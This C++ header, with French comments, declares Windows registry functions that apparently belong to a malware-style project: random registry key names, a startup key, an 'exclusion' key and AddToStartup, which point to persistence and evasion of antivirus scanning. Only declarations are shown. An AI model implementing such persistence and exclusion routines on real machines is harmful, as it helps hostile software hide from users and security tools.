#pragma once

#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <winsock.h>
#include <iostream>
#include <sys/stat.h>
#include <random>
#include <Shlwapi.h>


#pragma comment(lib, "Shlwapi.lib")

// Déclarations des fonctions liées au registre
std::wstring GenerateRandomRegistryKey(int length);
void SetStartupRegistryKey(const std::wstring& registryKey, const std::wstring& value);
void SetExclusionRegistryKey(const wchar_t* value);
void AddToStartup(void);